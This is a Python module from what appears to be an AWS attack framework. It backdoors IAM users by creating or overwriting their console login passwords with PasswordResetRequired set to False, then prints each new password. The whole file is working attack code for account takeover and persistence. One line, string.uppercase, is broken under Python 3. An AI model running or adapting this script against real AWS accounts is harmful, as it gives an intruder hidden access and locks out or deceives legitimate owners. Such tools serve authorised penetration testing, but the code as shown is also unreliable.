#!/usr/bin/env python3

import datetime
import argparse
from random import choice
import string
from botocore.exceptions import ClientError

def main(args, awsattack_main, data=None):
    session = awsattack_main.get_active_session()
    print = awsattack_main.print
    users = data

    summary_data = {}
    client = awsattack_main.get_boto3_client('iam')
    try:
        password_policy = client.get_account_password_policy()
    except:
        # Policy unable to be fetched, set to None so that a 128 char password
        # with all types of characters gets created below
        password_policy = None

    target_user = ''
    password = create_valid_password(password_policy)
    summary_data['backdoored_password_count'] = 0

    if args.update:
        func = 'update_login_profile'
        print('Modifying an IAM user\'s current password')
    else:
        func = 'create_login_profile'
        print('Creating an IAM user password')
    caller = getattr(client, func)

    for user in users:
        if args.usernames is None:
            pass
        else:
            print('  User: {}'.format(user))

        password = create_valid_password(password_policy)
        try:
            caller(
                UserName=user,
                Password=password,
                PasswordResetRequired=False)
        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDenied':
                print('    FAILURE: MISSING NEEDED PERMISSIONS')
            elif code == 'EntityAlreadyExists':
                print('    FAILURE: LOGIN PROFILE ALREADY EXISTS')
            else:
                print('    FAILURE: {}'.format(code))
            continue
        print('    Password successfully changed')
        print('    Password: {}'.format(password))
        summary_data['backdoored_password_count'] += 1
    return summary_data


def create_valid_password(password_policy):
    symbols = '!@#$%^&*()_+=-\][{}|;:",./?><`~'
    password = ''.join(choice(string.ascii_lowercase) for _ in range(3))
    try:
        if password_policy['RequireNumbers'] is True:
            password += ''.join(choice(string.digits) for _ in range(3))
        if password_policy['RequireSymbols'] is True:
            password += ''.join(choice(symbols) for _ in range(3))
        if password_policy['RequireUppercaseCharacters'] is True:
            password += ''.join(choice(string.uppercase) for _ in range(3))
        if password_policy['MinimumPasswordLength'] > 0:
            while len(password) < password_policy['MinimumPasswordLength']:
                password += choice(string.digits)
    except:
        # Password policy couldn't be grabbed for some reason, make a max-length
        # password with all types of characters, so no matter what, it will be accepted.
        characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + symbols
        password = ''.join(choice(characters) for _ in range(128))
    return password
